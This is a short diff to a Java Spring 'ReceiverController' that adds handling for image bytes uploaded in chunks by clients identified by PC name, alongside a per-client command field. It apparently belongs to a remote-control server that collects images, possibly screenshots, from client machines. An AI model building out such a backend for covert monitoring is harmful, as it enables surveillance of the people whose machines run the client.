@@ -4,6 +4,7 @@ import ch.lebois.server.data.entity.Client;
 import ch.lebois.server.data.entity.Message;
 import ch.lebois.server.data.repository.ClientRepository;
 import ch.lebois.server.data.repository.MessageRepository;
+import ch.lebois.server.service.ImageService;
 import org.springframework.stereotype.Controller;
 import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.PathVariable;
@@ -20,9 +21,13 @@ public class ReceiverController {
     private ClientRepository clientRepository;
     private MessageRepository messageRepository;
 
-    public ReceiverController(ClientRepository clientRepository, MessageRepository messageRepository) {
+    private ImageService imageService;
+
+    public ReceiverController(ClientRepository clientRepository, MessageRepository messageRepository,
+                              ImageService imageService) {
         this.clientRepository = clientRepository;
         this.messageRepository = messageRepository;
+        this.imageService = imageService;
     }
 
     @GetMapping("{pcName}")
@@ -40,6 +45,13 @@ public class ReceiverController {
         }
 
         switch (type) {
+            case "imgbytes":
+                imageService.addBytes(response);
+                break;
+            case "imgend":
+                saveMessage("message", imageService.createImg(client), client);
+                imageService.clearBytes();
+                break;
             case "reset":
                 client.setCommand("");
                 clientRepository.save(client);
